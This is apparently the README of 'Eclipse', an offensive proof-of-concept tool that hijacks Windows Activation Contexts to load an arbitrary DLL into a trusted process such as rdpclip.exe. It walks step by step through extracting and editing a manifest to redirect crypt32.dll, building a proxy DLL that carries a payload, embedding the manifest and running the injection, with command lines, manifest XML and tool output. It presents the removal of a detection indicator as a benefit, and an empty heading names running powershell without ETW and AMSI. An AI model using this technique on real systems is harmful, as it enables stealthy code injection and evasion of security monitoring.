# Description

Eclipse is a PoC that performs [Activation Context](https://learn.microsoft.com/en-us/windows/win32/sbscs/activation-contexts) hijack to load and run an arbitrary DLL in any desired process. Initially, this technique was created as a more flexible alternative to DLL Sideloading + DLL proxying that can be leveraged to inject arbitrary code in a trusted process, altought it has proven to have other applications.

	C:\Eclipse\eclipse\target\release>eclipse.exe -h
	Usage: eclipse.exe -m spawn|hijack -b C:\Windows\System32\rdpclip.exe -r 3 [options]

	Options:
    -h, --help          Print this help menu.
    -m, --mode          Hijack the Activation Context of a new (spawn) or an
                        already running (hijack) process.
    -b, --binary        Absolute path to the executable used to spawn the new
                        process.
    -f, --manifest-file
                        Path to the manifest file from which the new
                        Activation Context is created.
    -r, --resource-number
                        Resource index of the current executable where the
                        manifest is located.
    -i, --pid           PID of the process whose Activation Context is to be
                        hijacked.

# How it works 

By definition, Activation Contexts are "data structures in memory containing information that the system can use to redirect an application to load a particular DLL version" and also can be used to determine the path from where a specific dll has to be loaded. An Activation Context is created by parsing the contents of a manifest file. When a process is created, the OS parses the binary's manifest (which can be embbeded in the binary itself or as a independent file in the same directory) and it maps in the memory of the newly spawned process what I call the main **Activation Context**. This main AC will be used to find the right file each time a DLL has to be loaded (regardless of whether this load is due to dependencies in the IAT of a module or as a call to Loadlibray). 

Additionally, a thread can create and activate a custom AC at runtime. In that particular scenario, if that specific thread tries to load a DLL the thread's custom AC will be used first and, just in case that AC doesn't contain information regarding the DLL to be loaded, then the main AC of the process will be consulted. 

The memory address of the main AC of a process is obtained from the PEB, while custom AC activated by a thread are obtained from a AC stack located in the TEB. This mean one thread can create and activate multiple custom AC which will be pushed on an AC stack, and only the last activated AC (the one on top of the stack) will be used to determine the path of a DLL to be loaded.

With this in mind, Eclipse offers two modes of use:
* You can spawn a new process where your want to run your DLL. In this case, the process will be spawned in suspended mode and the main AC referenced by the PEB will be hijacked, allowing to set a custom AC (which I will refer to in this README as the “malicious” AC) as the main AC of the process. This will redirect the application to load your DLL instead of the legitimate DLL that would be loaded normally when the process execution is resumed.
* You can try to hijack the active AC of a running process. In case the main thread of that particular process has a custom AC activated, Eclipse will hijack the AC stack located in the TEB. Otherwise, the main AC referenced in the PEB will be hijacked. The result in both cases is the same: in case the main thread of the process tries to load a DLL referenced by the malicious AC created by Eclipse, your DLL will be loaded instead. 

# How to use it 
Regardless you are spawning a new process or hijacking an already running process, Eclipse needs a manifest file from which it will create the malicious AC. Some examples can be found in the **manifests** folder of this repository, although you can also obtain the manifest file embedded in any binary and modify it at will. To obtain the manifest file of a binary, I use the [Microsot Manifest Tool](https://learn.microsoft.com/en-us/cpp/build/reference/manifest-tool-property-pages?view=msvc-170). The following command extracts the manifest file of a executable and saves it in the specified location:
	
	C:\Temp> mt.exe -inputresource:"C:\Windows\System32\cmd.exe";#1 -out:"C:\Temp\cmd.exe.manifest"

Once the manifest file has been modified, just compile Eclipse in `release` mode and the tool will be ready to use:
	
	C:\Path\To\Eclipse\eclipse> cargo build --release

In case you want to embed the modified manifest file in the resulting Eclipse executable, you can use MT once again (I recommend to avoid using resource ID 1):

	C:\Temp> mt.exe -manifest "C:\Temp\fakecmd.exe.manifest" -outputresource:"C:\Path\To\Eclipse\eclipse\target\release\eclipse.exe";#4 <- Embed the manifest file in the resource ID 4

# Examples
## Hijack AC of a new process

This first example is meant to give some guidelines on how to use AC hijack to load and run your DLL in a trusted process. In this case, `rdpclip.exe` will be the selected process, although this methodology can be applied to almost any other process.
First, we need to find a DLL that will be loaded by the process in a regular execution. For this, we can use [PE-bear](https://github.com/hasherezade/pe-bear) to inspect the IAT of the binary.

![rdpclip.exe IAT.](/images/pebear.PNG "rdpclip.exe IAT.")

This inspection shows that `crypt32.dll` will be loaded at the process initialization, meaning this DLL is one of the multiple potential targets. Now, we need to know if any function of this DLL is being called during the normal execution of this process. For that, I use [ADPT](https://github.com/Kudaes/ADPT) ExportTracer, that will log in a file each function of this DLL that is called during the execution of the process. The ExportTracer DLL can be created with the following command (check ADPT Readme file for further instructions about how to use the tool):
	
	C:\Path\To\ADPT\Generator\target\release> generator.exe -m trace -p C:\Windows\System32\crypt32.dll -l C:\Temp\logfile.txt
	C:\Path\To\ADPT\ExportTracer> cargo build --release

The idea is that once the main AC of `rdpclip.exe` is hijacked by Eclipse, the recently compiled `exporttracer.dll` will be loaded instead of `crypt32.dll`. To do so, we need a custom manifest file that redirects the application into loading our DLL. To create the manifest file, we can use MT to extract the original manifest file of `rdpclip.exe` and then modify it at will:

	C:\Temp> mt.exe -inputresource:"C:\Windows\System32\rdpclip.exe";#1 -out:"C:\Temp\rdpclip.exe.manifest"

Then add the following `<file>` element to the contents of the extracted manifest file, pointing the `loadFrom` field to your `exporttracer.dll` DLL:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0" xmlns:asmv3="urn:schemas-microsoft-com:asm.v3">
<assemblyIdentity version="5.1.0.0" processorArchitecture="amd64" name="Microsoft.Windows.rdpclip" type="win32"></assemblyIdentity>
<description>RDP Clipboard Monitor</description>
<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
        <requestedPrivileges>
            <requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel>
        </requestedPrivileges>
    </security>
</trustInfo>
<application xmlns="urn:schemas-microsoft-com:asm.v3">
    <windowsSettings>
       <disableWindowFiltering xmlns="http://schemas.microsoft.com/SMI/2011/WindowsSettings">true</disableWindowFiltering>
    </windowsSettings>
</application>
<asmv3:application>
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
        <dpiAware>true/PM</dpiAware>
    </asmv3:windowsSettings>
</asmv3:application>
  <file name="crypt32.dll" hash="optional" loadFrom="C:/Path/To/Your/exporttracer.dll"/>
</assembly>
```

The last and **optional** step is to embed the modified manifest file as a resource of `eclipse.exe`. To do so, compile Eclipse on `release` mode and then use MT once again to embed the manifest file as the resource ID 4 (any other ID would work):

	C:\Path\To\Eclipse\eclipse> cargo build --release
	C:\Path\To\Eclipse\eclipse> mt.exe -manifest "C:\Temp\rdpclip.exe.manifest" -outputresource:"C:\Path\To\Eclipse\eclipse\target\release\eclipse.exe";4

Finally, run the tool:

	C:\Path\To\Eclipse\eclipse\target\release> eclipse.exe -m spawn -b C:\Windows\System32\rdpclip.exe -r 4
	[+] Activation Context created locally
	[+] New process spawned in suspended mode.
	[+] Remote process PEB base address obtained.
	[+] Memory successfully allocated in the new process.
	[+] Activation Context mapped in the remote process.
	[+] PEB successfully patched.
	[-] Resuming process...

Inspecting the newly spawned `rdpclip.exe` process with PH will reveal that `exporttracer.dll` has been loaded. The ExportTracer acts as a proxy, meaning it loads the legitimate `crypt32.dll` to forward all the received calls, but it will also have registered in `C:\Temp\logfile.txt` all the functions from `crypt32.dll` that have been called from `rdpclip.exe`:

![exporttracer loaded in rdpclip.exe.](/images/exporttracer.PNG "exporttracer loaded in rdpclip.exe.")
![Log file.](/images/exporttracer_log.PNG "Log file.")

Now, we just need to use `ADPT` once again to create a proxy dll that runs our desired payload on one of the called functions. In this case, I select the first one, `I_CryptCreateLruCache`:

	C:\Path\To\ADPT\Generator\target\release> generator.exe -m proxy -p C:\Windows\System32\crypt32.dll -e I_CryptCreateLruCache
	C:\Path\To\ADPT\ProxyDll> cargo build --release

Change the `loadFrom` field of the manifest file to point to the generated `proxydll.dll` and embed the manifest in `eclipse.exe` as before. Kill the previously spawned `rdpclip.exe` process (only one `rdpclip.exe` can be running per user session) and run Eclipse once again. The ProxyDll will be loaded and the payload inserted in the `I_CryptCreateLruCache` function will be executed within `rdpclip.exe` (in this case, just an infinite loop in a new thread):

![Main AC hijacked.](/images/proxydll.PNG "Main AC hijacked.")

Note how unlike when performing a regular DLL proxying, with this technique the proxy DLL does not need to have the same name as the DLL to which the calls are being forwarded, removing that specific IoC.


## Spawn powershell without ETW and AMSI
## Hijack AC of an already running process

# Conclusions
# References